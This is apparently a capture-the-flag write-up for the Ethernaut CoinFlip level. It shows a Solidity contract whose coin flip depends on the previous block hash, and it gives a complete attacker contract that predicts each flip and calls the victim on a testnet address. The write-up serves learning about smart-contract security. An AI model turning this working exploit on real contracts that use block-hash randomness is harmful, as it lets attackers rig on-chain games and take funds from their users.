The challenge is to provide the coin flip value 10 consecutive times.

````
pragma solidity ^0.4.18;

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
````

The following code portion means that you cannot do 10 guesses in the same block.

````
if (lastHash == blockValue) {
  revert();
}
````

Randomly picking `true` or `false` to provide for the contract has a 
negligible probability (2^-10).

We can also monitor the Ropsten network to learn the hash of the latest block, 
then quickly compute the flip value and make a transaction to the `flip` function.
This is however not 100% guaranteed to win 10 consecutive times.

My solution is to use a smart contract as an attacker, which computes the flip value,
and calls the `flip` function to guarantee the result.
This is possible because smart contract can access block hash :)

The following is my attacking contract, where `victim` is 
the address of the instance contract, which might be different from yours.

To win 10 times consecutively, all you need to do is call 10 times the `attack` 
function from your account.

````
pragma solidity ^0.4.18;
    
contract FlipAttacker {
    address public victim = 0xeff9679ad0a65a562119a6df583e6858da72e5e7;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    function attack() external {
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        victim.call(bytes4(keccak256("flip(bool)")), side);
    }
}
```` 